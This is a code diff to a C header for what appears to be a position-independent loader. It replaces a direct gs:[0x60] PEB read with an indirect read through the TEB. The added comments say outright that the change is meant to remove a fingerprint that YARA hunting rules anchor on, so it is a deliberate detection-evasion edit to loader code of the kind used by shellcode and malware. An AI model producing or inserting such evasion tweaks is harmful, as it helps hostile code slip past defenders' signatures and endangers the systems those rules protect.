@@ -355,14 +355,23 @@ typedef struct _TEB
     PVOID ReservedForWdf;
 } TEB, *PTEB;
 
-// Direct PEB access via gs:[0x60] — avoids NtCurrentTeb() call pattern
+// PEB access via TEB indirection: gs:[0x30] -> TEB self pointer, then
+// load PEB from TEB+0x60. The first instruction (TEB load) is shared
+// with all legitimate TLS / thread-id / NtCurrentTeb code paths and
+// is not a meaningful YARA signal. The `gs:[0x60]` direct form, by
+// contrast, is the canonical PIC-loader fingerprint that hunting
+// rules anchor on. Using TEB indirection sheds that anchor.
 #if defined(_MSC_VER)
-  #define GET_PEB() ((PPEB)__readgsqword(0x60))
+  static __inline PPEB __get_peb(void) {
+    void *teb = (void*)__readgsqword(0x30);
+    return *(PPEB*)((char*)teb + 0x60);
+  }
+  #define GET_PEB() __get_peb()
 #else
   static __inline__ PPEB __get_peb(void) {
-    void *p;
-    __asm__ volatile("mov %%gs:0x60, %0" : "=r"(p));
-    return (PPEB)p;
+    void *teb;
+    __asm__ volatile("mov %%gs:0x30, %0" : "=r"(teb));
+    return *(PPEB*)((char*)teb + 0x60);
   }
   #define GET_PEB() __get_peb()
 #endif
